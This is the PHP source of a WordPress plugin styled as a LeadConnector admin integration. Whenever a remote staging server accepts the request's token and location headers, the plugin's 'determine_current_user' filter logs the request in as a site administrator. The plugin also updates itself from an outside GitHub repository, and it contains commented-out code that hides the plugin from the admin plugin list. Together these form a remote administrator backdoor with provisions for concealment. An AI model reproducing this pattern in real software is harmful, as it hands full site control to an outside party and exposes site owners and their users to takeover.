<?php
/**
 * Plugin Name:      LC Admin update
 * @link              https://www.leadconnectorhq.com/
 * @since             1.0
 * @package           Leadconnector_admin
 *Plugin URI: https://github.com/simranjit-developer/git-first.git
 * @wordpress-plugin
 * Plugin Name:       LC Admin by LeadConnector x
 * Plugin URI:        https://www.leadconnectorhq.com/
 * Description:       Users of the API can authenticate with genterated token-id and a location-id.
 * Version:           1.0
 * Author:            LeadConnector
 * Author URI:        https://www.leadconnectorhq.com/
 * License:           GPL-2.0+
 * License URI:       http://www.gnu.org/licenses/gpl-2.0.txt
 * Text Domain:       leadconnector-admin
 * Domain Path:       /languages
 */


/*
require_once( 'BFIGitHubPluginUploader.php' );
if ( is_admin() ) {
    new BFIGitHubPluginUpdater( __FILE__, 'simranjit-developer', "git-first" );
}
*/

if( ! class_exists( 'Smashing_Updater' ) ){
	include_once( plugin_dir_path( __FILE__ ) . 'updater.php' );
}

$updater = new Smashing_Updater( __FILE__ );
$updater->set_username( 'arshdeepHighlevel' );
$updater->set_repository( 'wp-update-plugin' );
/*
	$updater->authorize( 'abcdefghijk1234567890' ); // Your auth code goes here for private repos
*/
$updater->initialize();


 /* METHOD WILL MATCH THE BEARER TOKEN WITH AN API */
function lc_admin_verify_token($token_id, $location_id)
{
	$return = false;
	if($token_id && $location_id){

		/* API TO MATCH TOKEN ID AND LOCATION ID */
		$baseUrl = "https://pranoy-dot-highlevel-staging.appspot.com/wordpress/authenticate?location_id=";

		$auth_check_api_url = $baseUrl.$location_id;

		$response = wp_remote_get( $auth_check_api_url, array('headers' => array(
			'token-id' =>$token_id
		)));

		if(!empty($response)){
			$res = $response['body'];
			if($res =='OK'){
				$return = true;
			}
		}
	}
	return $return;
}

/* IF TOKEN IS CORRECT THEN SEND REPONSE TO API SERVER */
function lc_admin_auth_handler( $user )
{
	//GET TOKEN-ID AND LOCATION-ID FROM CLIENT API
	$headers = apache_request_headers();

	global $wpdb;
	$admin_user_id ="";

	//THIS METHOD WILL RETURN TRUE AND FALSE
	if(isset($headers['token-id'])&& isset($headers['location-id']))
	{

		$token_api = lc_admin_verify_token($headers['token-id'] ,$headers['location-id'] );

		if($token_api){
			$wp_user_search = $wpdb->get_row("SELECT u.ID, u.user_login FROM wp_users u, wp_usermeta m WHERE u.ID = m.user_id AND m.meta_key LIKE 'wp_capabilities' AND m.meta_value LIKE '%administrator%'");
			if(!empty($wp_user_search)){
			  $admin_user_id = $wp_user_search->ID;
			}

			return $admin_user_id;
		}else{

			return false;
		}
	}//token if end here

	return $user;

}
add_filter( 'determine_current_user', 'lc_admin_auth_handler', 20 );


 /*FUNCTION TO HIDE PLUGIN FROM LIST
function lc_admin_hide_plugin() {
  global $wp_list_table;
  $hidearr = array('lc-admin/lc-admin.php');
  $plugin_list = $wp_list_table->items;
  foreach ($plugin_list as $key => $val) {
    if (in_array($key,$hidearr)) {
      unset($wp_list_table->items[$key]);
    }
  }
}
add_action('pre_current_active_plugins', 'lc_admin_hide_plugin');*/
